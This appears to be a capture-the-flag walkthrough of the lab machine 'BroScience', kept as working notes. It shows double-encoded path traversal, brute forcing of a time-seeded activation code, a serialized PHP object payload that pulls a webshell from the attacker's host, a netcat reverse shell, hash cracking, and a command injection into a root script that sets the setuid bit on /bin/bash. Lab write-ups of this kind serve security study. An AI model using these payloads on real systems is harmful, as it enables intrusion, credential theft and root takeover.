@@ -1,0 +1,807 @@
+10.10.11.195
+
+[04:38:50] Starting: 
+[04:38:53] 403 -  280B  - /.ht_wsr.txt                                     
+[04:38:53] 403 -  280B  - /.htaccess.bak1
+[04:38:53] 403 -  280B  - /.htaccess.sample
+[04:38:53] 403 -  280B  - /.htaccess.save
+[04:38:53] 403 -  280B  - /.htaccess.orig
+[04:38:53] 403 -  280B  - /.htaccess_extra
+[04:38:53] 403 -  280B  - /.htaccess_orig
+[04:38:54] 403 -  280B  - /.htaccessBAK
+[04:38:54] 403 -  280B  - /.htaccessOLD2
+[04:38:54] 403 -  280B  - /.htaccess_sc
+[04:38:54] 403 -  280B  - /.htaccessOLD
+[04:38:54] 403 -  280B  - /.htm                                            
+[04:38:54] 403 -  280B  - /.html
+[04:38:54] 403 -  280B  - /.htpasswd_test
+[04:38:54] 403 -  280B  - /.htpasswds
+[04:38:54] 403 -  280B  - /.httr-oauth
+[04:38:55] 403 -  280B  - /.php                                            
+[04:39:27] 301 -  319B  - /images  ->  https://broscience.htb/images/       
+[04:39:28] 200 -    2KB - /images/                                          
+[04:39:28] 200 -    2KB - /includes/                                        
+[04:39:28] 301 -  321B  - /includes  ->  https://broscience.htb/includes/   
+[04:39:28] 200 -    9KB - /index.php                                        
+[04:39:28] 200 -    9KB - /index.php/login/                                 
+[04:39:29] 301 -  323B  - /javascript  ->  https://broscience.htb/javascript/
+[04:39:32] 200 -    2KB - /login.php                                        
+[04:39:32] 302 -    0B  - /logout.php  ->  /index.php                       
+[04:39:33] 200 -  676B  - /manual/index.html                                
+[04:39:34] 301 -  319B  - /manual  ->  https://broscience.htb/manual/       
+[04:39:45] 200 -    2KB - /register.php                                     
+[04:39:48] 403 -  280B  - /server-status/                                   
+[04:39:48] 403 -  280B  - /server-status                                    
+[04:39:52] 301 -  319B  - /styles  ->  https://broscience.htb/styles/       
+[04:39:56] 200 -    1KB - /user.php   
+
+
+https://broscience.htb/includes/
+
+[ ]	db_connect.php	2023-01-17 04:35 	337 	 
+[ ]	header.php	2023-01-17 04:35 	369 	 
+[ ]	img.php	2023-01-17 04:35 	483 	 
+[ ]	navbar.php	2023-01-17 04:35 	1.2K	 
+[ ]	utils.php	2023-01-17 04:35 	3.0K	 
+
+
+db_connect.php looks interesting but obv I can't read the content
+
+img.php gives me: Error: Missing 'path' parameter.
+
+I can try to add a path 
+
+https://broscience.htb/includes/img.php?path=../
+
+I get 
+
+Error: Attack detected.
+
+I could try to bypass the check using encoding and so on...
+
+https://broscience.htb/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+I can bypass it using double encoding: 
+
+https://github.com/JahTheTrueGod/Directory-Traversal-Cheat-Sheet
+
+I get image has errors and can't be displayed but still I am able to access the file
+
+
+but with curl it works fine I don't know why:
+
+curl -k https://broscience.htb/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+                                                 
+
+I try to read db_connect
+
+curl -k https://broscience.htb/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fincludes%252fdb_connect.php
+<?php
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
+
+if (!$db_conn) {
+    die("<b>Error</b>: Unable to connect to database");
+}
+?>   
+
+
+
+I try to read other files too, login.php:
+
+curl -k https://broscience.htb/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252flogin.php                                                          
+<?php
+session_start();
+
+// Check if user is logged in already
+if (isset($_SESSION['id'])) {
+    header('Location: /index.php');
+}
+
+// Handle a submitted log in form
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    // Check if variables are empty
+    if (!empty($_POST['username']) && !empty($_POST['password'])) {    
+        include_once 'includes/db_connect.php';
+        
+        // Check if username:password is correct
+        $res = pg_prepare($db_conn, "login_query", 'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2');
+        $res = pg_execute($db_conn, "login_query", array($_POST['username'], md5($db_salt . $_POST['password'])));
+        
+        if (pg_num_rows($res) == 1) {
+            // Check if account is activated
+            $row = pg_fetch_row($res);
+            if ((bool)$row[2]) {
+                // User is logged in
+                $_SESSION['id'] = $row[0];
+                $_SESSION['username'] = $row[1];
+                $_SESSION['is_admin'] = $row[3];
+
+                // Redirect to home page
+                header('Location: /index.php');
+            } else {
+                $alert = "Account is not activated yet";
+            }
+        } else {
+            $alert = "Username or password is incorrect.";
+        }
+    } else {
+        $alert = "Please fill in both username and password.";
+    }
+}
+?>
+
+
+in includes/utils.php
+
+function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}
+
+
+maybe I could guess the activation code ? and try to login creating a profile 
+
+but I don't know where to put the coode, even if I was able to bruteforce it 
+
+reading register.php (using the ususal path vulnerability):
+
+
+// TODO: Send the activation link to email
+                                    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
+
+
+so the email is not implemented yet the only way in is guessing and bruteforcing the activation code
+
+I need to know the server time to have the same rand generator
+
+The server seds it in the response to my requests:
+
+Date: Tue, 17 Jan 2023 10:03:54 GMT
+
+
+Within a certain range I could be able to get the activation code
+
+first of all create a profile 
+
+
+and take the time 
+
+Tue, 17 Jan 2023 10:54:27 GMT
+
+so the initial time is 
+
+1673952867
+
+I will try to go from 
+1673952860 to 1673952870
+
+so 10 seconds of range, this should be enough to catch the right code 
+
+I get this small wordlist:
+
+5VTGmSYQ4RDSBhWkiUEVEuv6GxChmbCJ
+xulKBUmdGSygUYF8QIhTfOV58DMFmaqz
+Pz1Jf2C6KKiSTT7lHKRT3taDqwb7Ah61
+RZMpIzygKpaQFrtmxH94ZktsEUTu0fUh
+jHM6BHiE0jJxkTiZ94nmlfUSQCyKK2Le
+UMLgmbqACWR2C3CwgEmbRc5oHApUPa85
+Jnrm6fyE2DdAnr1TjgY9830WzvyU5Agq
+OsjmKmL4jTb4IyOOoaihD5Fj0un0ZiMH
+wbez2I93CjN77VFtifhBHbz4ijuakCTT
+LtaQzoe4HrWIs6aojYyQ7Xwz2ywcCgR0
+
+now I can try with WFUZZ to not do it manually 
+
+wfuzz -w /home/kali/Desktop/broscience/activation_wordlist https://broscience.htb/activate.php?code=FUZZ
+
+
+
+
+ wfuzz -w /home/kali/Desktop/broscience/activation_wordlist https://broscience.htb/activate.php?code=FUZZ
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://broscience.htb/activate.php?code=FUZZ
+Total requests: 20
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000007:   200        27 L     66 W       1256 Ch     "ovp7ZmTqu8VshejStzDIo6ORls2PAq7a"                                                                                                                                         
+000000003:   200        27 L     66 W       1256 Ch     "AE1QCrD3hupWnFQPykz9NROgFnBreSPL"                                                                                                                                         
+000000001:   200        27 L     65 W       1251 Ch     "OsZJyy1D3SOKsdnlCY2JqoVDGVroK5ru"                                                                                                                                         
+000000020:   200        27 L     66 W       1256 Ch     "sKbms467DGvn1EAvTDOauT1tEeSaHsgC"                                                                                                                                         
+000000018:   200        27 L     66 W       1256 Ch     "2L0deiOlrFswKEcb8cJmI4Ruyf7ePMUG"                                                                                                                                         
+000000014:   200        27 L     66 W       1256 Ch     "fM5CxCW3L2WR1afKtAimeYx40tLMdKsR"                                                                                                                                         
+000000015:   200        27 L     66 W       1256 Ch     "dZYcJF1HYW8sEKbSaUBHoQ6cN4UteBiI"                                                                                                                                         
+000000019:   200        27 L     66 W       1256 Ch     "x7n9RBeTR3uUMsOmNFhLH2vzdbBMwSVp"                                                                                                                                         
+000000017:   200        27 L     66 W       1256 Ch     "t1KgPAXwimBQU9F6fUcW5P4KxcKRRLMw"                                                                                                                                         
+000000016:   200        27 L     66 W       1256 Ch     "iHhRTzRTE3n8eMcexM06tW1KhMKNsMiR"                                                                                                                                         
+000000013:   200        27 L     66 W       1256 Ch     "pBwOmF6jYVXQthOoZDmiJ5nBkqrrkgPt"                                                                                                                                         
+000000012:   200        27 L     66 W       1256 Ch     "msbSOaJCwwCfeQ3nDhOLETIbULXBrJj8"                                                                                                                                         
+000000010:   200        27 L     66 W       1256 Ch     "mxSy8OpRzidryk90AKXrmrM4pnBic64v"                                                                                                                                         
+000000011:   200        27 L     66 W       1256 Ch     "tjtYEyGrjLnZfZQRjpkRwsRKJ3nGgXTj"                                                                                                                                         
+000000009:   200        27 L     66 W       1256 Ch     "lKxX4Xs8QfrA7cPni0Y3UAyyLGa7uCjv"                                                                                                                                         
+000000006:   200        27 L     66 W       1256 Ch     "2t80ZQJhw2EycsFif7IcdQpsx0PSFjku"                                                                                                                                         
+000000005:   200        27 L     66 W       1256 Ch     "vssiBiqw3rFuBOO7aBCVOpGiKHbbGf8p"                                                                                                                                         
+000000008:   200        27 L     66 W       1256 Ch     "L2T1J4gz7ivTRmAC1oxegn0cw2kmMW1L"                                                                                                                                         
+000000004:   200        27 L     66 W       1256 Ch     "cRX40DdE4Hn1n7z3BZNL0FexQH4gzjKN"                                                                                                                                         
+000000002:   200        27 L     66 W       1256 Ch     "TAVfOahNfNNvZwu30bx9QIvEypKJiajQ" 
+
+OsZJyy1D3SOKsdnlCY2JqoVDGVroK5ru    is the right one now I should be able to access witu user:password
+
+
+now I am logged in, the only thing i can do is swap the them from light to dark, try to read the php file (swap_theme.php)
+
+
+
+
+
+curl -k https://broscience.htb/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fswap_theme.php
+<?php
+session_start();
+
+// Check if user is logged in already
+if (!isset($_SESSION['id'])) {
+    header('Location: /index.php');
+}
+
+// Swap the theme
+include_once "includes/utils.php";
+if (strcmp(get_theme(), "light") === 0) {
+    set_theme("dark");
+} else {
+    set_theme("light");
+}
+
+// Redirect
+if (!empty($_SERVER['HTTP_REFERER'])) {
+    header("Location: {$_SERVER['HTTP_REFERER']}");
+} else {
+    header("Location: /index.php");
+}   
+
+
+
+
+wathever happens to the theme (wathever string it receives) this function is executed:
+
+function set_theme($val) {
+    if (isset($_SESSION['id'])) {
+        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
+    }
+}
+
+
+
+
+
+
+
+
+https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html
+https://securitycafe.ro/2015/01/05/understanding-php-object-injection/
+
+
+
+this is utils.php:
+
+<?php
+function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}
+
+// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
+function rel_time($from, $to = null) {
+    $to = (($to === null) ? (time()) : ($to));
+    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
+    $from = ((is_int($from)) ? ($from) : (strtotime($from)));
+
+    $units = array
+    (
+        "year"   => 29030400, // seconds in a year   (12 months)
+        "month"  => 2419200,  // seconds in a month  (4 weeks)
+        "week"   => 604800,   // seconds in a week   (7 days)
+        "day"    => 86400,    // seconds in a day    (24 hours)
+        "hour"   => 3600,     // seconds in an hour  (60 minutes)
+        "minute" => 60,       // seconds in a minute (60 seconds)
+        "second" => 1         // 1 second
+    );
+
+    $diff = abs($from - $to);
+
+    if ($diff < 1) {
+        return "Just now";
+    }
+
+    $suffix = (($from > $to) ? ("from now") : ("ago"));
+
+    $unitCount = 0;
+    $output = "";
+
+    foreach($units as $unit => $mult)
+        if($diff >= $mult && $unitCount < 1) {
+            $unitCount += 1;
+            // $and = (($mult != 1) ? ("") : ("and "));
+            $and = "";
+            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
+            $diff -= intval($diff / $mult) * $mult;
+        }
+
+    $output .= " ".$suffix;
+    $output = substr($output, strlen(", "));
+
+    return $output;
+}
+
+class UserPrefs {
+    public $theme;
+
+    public function __construct($theme = "light") {
+                $this->theme = $theme;
+    }
+}
+
+function get_theme() {
+    if (isset($_SESSION['id'])) {
+        if (!isset($_COOKIE['user-prefs'])) {
+            $up_cookie = base64_encode(serialize(new UserPrefs()));
+            setcookie('user-prefs', $up_cookie);
+        } else {
+            $up_cookie = $_COOKIE['user-prefs'];
+        }
+        $up = unserialize(base64_decode($up_cookie));
+        return $up->theme;
+    } else {
+        return "light";
+    }
+}
+
+function get_theme_class($theme = null) {
+    if (!isset($theme)) {
+        $theme = get_theme();
+    }
+    if (strcmp($theme, "light")) {
+        return "uk-light";
+    } else {
+        return "uk-dark";
+    }
+}
+
+function set_theme($val) {
+    if (isset($_SESSION['id'])) {
+        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
+    }
+}
+
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+?>   
+
+
+I can see there are various classes, the most interesting is AvatarInterface because it contains __wakeup() magic method
+Inside this method it creates a new Avatar() passing imgPath and the uses the method save() that writes to file
+
+basically I can give this function two parameter: imgPath -> file path  
+                                                  tmp -> payload to write into file
+
+I could use this to drop a php reverse shell into the web root 
+
+Now I have to build the payload and then login, change the theme, intercept the request with burpsuite and insert my payload 
+
+then I should have a file created under the web root with my webshell 
+
+
+original request:
+
+
+GET /swap_theme.php HTTP/1.1
+Host: broscience.htb
+Cookie: PHPSESSID=5irk6jrjeevr11c9gvqamcvp6e; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D
+Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://broscience.htb/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+the parameter I have to change is 
+
+user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D
+
+
+which is in base64, decoded:
+
+O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
+
+Let's try to change it:
+using serialize_data.php I get:
+
+O:15:"AvatarInterface":2:{s:3:"tmp";s:5:"prova";s:7:"imgPath";s:6:"prova2";}  
+
+
+now I need to encode it in base64 and send it 
+
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo1OiJwcm92YSI7czo3OiJpbWdQYXRoIjtzOjY6InByb3ZhMiI7fSAg
+
+the file is created 
+
+but with no content inside 
+
+this happens because it uses the file_get_contents but from php documentation:
+
+
+Example #1 Get and output the source of the homepage of a website
+
+<?php
+$homepage = file_get_contents('http://www.example.com/');
+echo $homepage;
+?>
+
+it can read also from sites, I can make it connect to my attack machine
+
+
+O:15:"AvatarInterface":2:{s:3:"tmp";s:35:"http://10.10.14.6:8000/webshell.php";s:7:"imgPath";s:12:"webshell.php";}
+
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozNToiaHR0cDovLzEwLjEwLjE0LjY6ODAwMC93ZWJzaGVsbC5waHAiO3M6NzoiaW1nUGF0aCI7czoxMjoid2Vic2hlbGwucGhwIjt9
+
+
+I got webshell!
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+now reverse shell
+
+
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.195] 56934
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd   
+/var/www/html
+ls -lart
+total 76
+-rw-r--r-- 1 www-data www-data 4969 Jan 17 10:00 exercise.php
+-rw-r--r-- 1 www-data www-data  930 Jan 17 10:00 comment.php
+-rw-r--r-- 1 www-data www-data 2026 Jan 17 10:00 activate.php
+drwxr-xr-x 3 root     root     4096 Jan 17 10:00 ..
+-rw-r--r-- 1 www-data www-data 5052 Jan 17 10:00 user.php
+-rw-r--r-- 1 www-data www-data 3040 Jan 17 10:00 update_user.php
+-rw-r--r-- 1 www-data www-data  436 Jan 17 10:00 swap_theme.php
+drwxr-xr-x 2 www-data www-data 4096 Jan 17 10:00 styles
+-rw-r--r-- 1 www-data www-data 5743 Jan 17 10:00 register.php
+-rw-r--r-- 1 www-data www-data   93 Jan 17 10:00 logout.php
+-rw-r--r-- 1 www-data www-data 3028 Jan 17 10:00 login.php
+-rw-r--r-- 1 www-data www-data 2182 Jan 17 10:00 index.php
+drwxr-xr-x 2 www-data www-data 4096 Jan 17 10:00 includes
+drwxr-xr-x 2 www-data www-data 4096 Jan 17 10:00 images
+drwxr-xr-x 5 www-data www-data 4096 Jan 17 10:01 .
+-rw-r--r-- 1 www-data www-data  300 Jan 17 10:01 webshell.php
+
+
+
+Now I am inside the machine, I could try to use the credentials I found before for the database and see if I can find anything
+
+
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+(mysql does not exist)
+
+?>ps -aux | grep -i sql
+postgres     830  0.2  1.3 213280 28228 ?        Ss   03:14   1:12 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf
+www-data  122617  0.0  0.0   3244   636 ?        S    10:07   0:00 grep -i sql
+
+psql -d broscience -h localhost -p 5432 -U dbuser -W 
+
+psql -d broscience -h localhost -p 5432 -U dbuser -W
+Password: RangeOfMotion%777
+
+id
+\echo "prova"
+"prova"
+\d
+                List of relations
+ Schema |       Name       |   Type   |  Owner   
+--------+------------------+----------+----------
+ public | comments         | table    | postgres
+ public | comments_id_seq  | sequence | postgres
+ public | exercises        | table    | postgres
+ public | exercises_id_seq | sequence | postgres
+ public | users            | table    | postgres
+ public | users_id_seq     | sequence | postgres
+(6 rows)
+
+select * from users;
+ERROR:  syntax error at or near "id"
+LINE 1: id
+        ^
+select * from users
+;
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+(5 rows)
+
+
+I can try to crack these passwords to see if there is any credentials reuse.
+I already have salt to use:
+
+$db_salt = "NaCl";
+
+
+hash-identifier 15657792073e8a843d4f91fc403454e1
+
+
+Possible Hashs:
+[+] MD5
+
+try to crack with hashcat
+
+hashcat -m 20 pwd_found_db /usr/share/wordlists/rockyou.txt
+
+13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
+5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
+
+bill:iluvhorsesandgym
+dmytro:Aaronthehottest
+michael:2applesplus2apples
+
+from /etc/passwd:
+
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+
+maybe bill has a password reuse problem:
+
+yes
+
+ssh bill@broscience.htb
+bill@broscience.htb's password: 
+Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
+bill@broscience:~$ id
+uid=1000(bill) gid=1000(bill) groups=1000(bill)
+bill@broscience:~$ cat user.txt 
+3c57983f9791a08b4e437fbc7f9fd3aa
+bill@broscience:~$ 
+
+
+bill@broscience:~$ sudo -l
+[sudo] password for bill: 
+Sorry, user bill may not run sudo on broscience.
+
+bill@broscience:/opt$ cat renew_cert.sh 
+#!/bin/bash
+
+if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
+    echo "Usage: $0 certificate.crt";
+    exit 0;
+fi
+
+if [ -f $1 ]; then
+
+    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+
+    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+    country=$(echo $subject | grep -Eo 'C = .{2}')
+    state=$(echo $subject | grep -Eo 'ST = .*,')
+    locality=$(echo $subject | grep -Eo 'L = .*,')
+    organization=$(echo $subject | grep -Eo 'O = .*,')
+    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
+    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+    emailAddress=$(openssl x509 -in $1 -noout -email)
+
+    country=${country:4}
+    state=$(echo ${state:5} | awk -F, '{print $1}')
+    locality=$(echo ${locality:3} | awk -F, '{print $1}')
+    organization=$(echo ${organization:4} | awk -F, '{print $1}')
+    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
+    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
+
+    echo $subject;
+    echo "";
+    echo "Country     => $country";
+    echo "State       => $state";
+    echo "Locality    => $locality";
+    echo "Org Name    => $organization";
+    echo "Org Unit    => $organizationUnit";
+    echo "Common Name => $commonName";
+    echo "Email       => $emailAddress";
+
+    echo -e "\nGenerating certificate...";
+    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    $locality
+    $organization
+    $organizationUnit
+    $commonName
+    $emailAddress
+    " 2>/dev/null
+
+    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+else
+    echo "File doesn't exist"
+    exit 1;
+
+
+this script is owned by root 
+
+I can't find much more with manual enumeration 
+
+try linpeas and pspy:
+
+nothing interesting in linpeas
+
+from pspy64:
+
+
+2023/01/12 10:00:01 CMD: UID=0    PID=79081  | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+
+so the script gets called by root 
+I have to try to perform command injection
+
+I can craft the broscience.crt file 
+
+so the script takes subject from crt:
+
+subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+and then uses 
+
+echo $subject;
+
+maybe if I craft subject as a command it could be executed
+
+
+create the certificate:
+
+openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
+
+I can't inject in subject because it is not a field...
+It contains all the other fields.
+Anyway I can inject in some other fields.
+
+some fields are not suitable like Country that only accepts some characters
+I can try with organization, org unit or common name for example
+
+https://book.hacktricks.xyz/pentesting-web/command-injection#examples
+
+not working on org and org unit try common name 
+
+from cheatsheet (https://book.hacktricks.xyz/pentesting-web/command-injection#examples)
+
+I can try: 
+
+`ls` # ``
+$(ls) # $()
+
+after various tries:
+
+Common Name (e.g. server FQDN or YOUR name) []:`chmod u+s /bin/bash`
+
+
+bill@broscience:~$ ls -lart /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+bill@broscience:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
+bash-5.1# cat /root/root.txt 
+4b02c2e0434e03a07e0624f991295fd8
+bash-5.1# 
+
+
+
